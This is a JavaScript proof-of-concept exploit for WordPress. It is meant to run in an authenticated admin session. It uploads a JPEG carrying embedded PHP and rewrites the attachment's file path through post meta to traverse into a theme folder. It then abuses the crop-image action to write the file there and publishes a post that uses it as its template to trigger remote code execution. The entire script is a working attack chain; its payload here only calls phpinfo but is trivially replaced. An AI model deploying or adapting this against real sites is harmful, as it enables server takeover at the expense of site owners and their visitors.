var wpnonce = '';
var ajaxnonce = '';
var wp_attached_file = '';
var imgurl = '';
var postajaxdata = '';
var post_id = 0;
var cmd = '<?php phpinfo();/*';
var cmdlen = cmd.length
var payload = '\xff\xd8\xff\xed\x004Photoshop 3.0\x008BIM\x04\x04'+'\x00'.repeat(5)+'\x17\x1c\x02\x05\x00\x07PAYLOAD\x00\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00\xff\xdb\x00C\x00\x06\x04\x05\x06\x05\x04\x06\x06\x05\x06\x07\x07\x06\x08\x0a\x10\x0a\x0a\x09\x09\x0a\x14\x0e\x0f\x0c\x10\x17\x14\x18\x18\x17\x14\x16\x16\x1a\x1d%\x1f\x1a\x1b#\x1c\x16\x16 , #&\x27)*)\x19\x1f-0-(0%()(\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xc4\x00\x14\x00\x01'+'\x00'.repeat(15)+'\x08\xff\xc4\x00\x14\x10\x01'+'\x00'.repeat(16)+'\xff\xda\x00\x08\x01\x01\x00\x00?\x00T\xbf\xff\xd9';
var img = payload.replace('\x07PAYLOAD', String.fromCharCode(cmdlen) + cmd);
var byteArray = Uint8Array.from(img, function(c){return c.codePointAt(0);});
var attachurl = '/wp-admin/media-new.php';
var uploadurl = '/wp-admin/async-upload.php';
var editattachurl = '/wp-admin/post.php?post=PID&action=edit';
var editposturl = '/wp-admin/post.php';
var addposturl = '/wp-admin/post-new.php';
var cropurl = '/wp-admin/admin-ajax.php';
console.log("Get wpnonce token.");
jQuery.get(attachurl, function(data) {
    wpnonce = jQuery(data).find('#file-form #_wpnonce').val();
    if(wpnonce) {
        console.log("Success! wpnonce: " + wpnonce);
        var postdata = new FormData();
        postdata.append('name', 'ebaldremal.jpg');
        postdata.append('post_id', post_id);
        postdata.append('_wpnonce', wpnonce);
        postdata.append('short', 1);
        // file
        var phpimage = new File([byteArray], 'ebaldremal.jpg');
        postdata.append('async-upload', phpimage);
        console.log("Upload image with shell.");
        jQuery.ajax({
            url: uploadurl,
            data: postdata,
            cache: false,
            contentType: false,
            processData: false,
            method: 'POST',
            success: function(data){
                if(jQuery.isNumeric(data)) {
                    post_id = data;
                    console.log("Success! Attach ID: " + post_id);
                    console.log("Get wpnonce for edit post, ajax_nonce for crop and URL for fun.");
                    jQuery.get(editattachurl.replace('PID', post_id), function(data) {
                        var btnid = "#imgedit-open-btn-" + post_id;
                        wpnonce = jQuery(data).find('#post #_wpnonce').val();
                        ajaxnonce = jQuery(data).find(btnid).attr('onclick').match(/[a-f0-9]{10}/)[0];
                        imgurl = new URL(jQuery(data).find('#attachment_url').val());
                        wp_attached_file = imgurl.pathname.match(/uploads\/(.*)/)[1] + "?/any";
                        console.log("Success! wpnonce: " + wpnonce + ", ajaxnonce: " + ajaxnonce);
                        if(wpnonce && ajaxnonce) {
                            console.log("Update _wp_attached_file meta key to: " + wp_attached_file);
                            postdata = {
                                '_wpnonce': wpnonce,
                                'action': 'editpost',
                                'post_ID': post_id,
                                'meta_input[_wp_attached_file]': wp_attached_file
                            }
                            jQuery.post(editposturl, postdata, function(data){
                                console.log("Success!");
                                console.log("Crop image for create help folder.");
                                postajaxdata = {
                                    '_ajax_nonce': ajaxnonce,
                                    'action': 'crop-image',
                                    'id': post_id,
                                    'cropDetails[width]': 1,
                                    'cropDetails[height]': 1
                                }
                                jQuery.post(cropurl, postajaxdata, function(data){
                                    console.log("Success! Help directory created.");
                                    wp_attached_file = imgurl.pathname.match(/uploads\/(.*)/)[1] + "?/../../../../themes/twentynineteen/owned";
                                    console.log("Update _wp_attached_file meta key to: " + wp_attached_file);
                                    postdata = {
                                        '_wpnonce': wpnonce,
                                        'action': 'editpost',
                                        'post_ID': post_id,
                                        'meta_input[_wp_attached_file]': wp_attached_file
                                    }
                                    jQuery.post(editposturl, postdata, function(data){
                                        console.log("Success!");
                                        console.log("Crop image for create evil jpg image inside twentynineteen theme folder.");
                                        jQuery.post(cropurl, postajaxdata, function(data){
                                            console.log("Success!");
                                            console.log("Get wpnonce for create new post.");
                                            jQuery.get(addposturl, function(data){
                                                console.log("Create new post and use evil jpg image as template.");
                                                if(jQuery(data).find('form.metabox-base-form').length) {
                                                    wpnonce = jQuery(data).find('form.metabox-base-form #_wpnonce').val();
                                                    post_id = jQuery(data).find('form.metabox-base-form #post_ID').val();
                                                } else {
                                                    wpnonce = jQuery(data).find('#post #_wpnonce').val();
                                                    post_id = jQuery(data).find('#post #post_ID').val();
                                                }
                                                postdata = {
                                                    '_wpnonce': wpnonce,
                                                    'action': 'editpost',
                                                    'post_ID': post_id,
                                                    'post_title': 'RCE-HERE',
                                                    'visibility': 'public',
                                                    'publish': 'Publish',
                                                    'meta_input[_wp_page_template]': 'cropped-owned.jpg'
                                                }
                                                jQuery.post(editposturl, postdata, function(data){
                                                    console.log("Success! Browse post with id = " + post_id + " to trigger RCE.")
                                                    console.log("Trying to open: " + imgurl.origin + "/?p=" + post_id + ")");
                                                    window.open(imgurl.origin + "/?p=" + post_id, '_blank');
                                                });
                                            });
                                        });
                                    });
                                });
                            });
                        }
                    });
                }
            }
        });
    }
});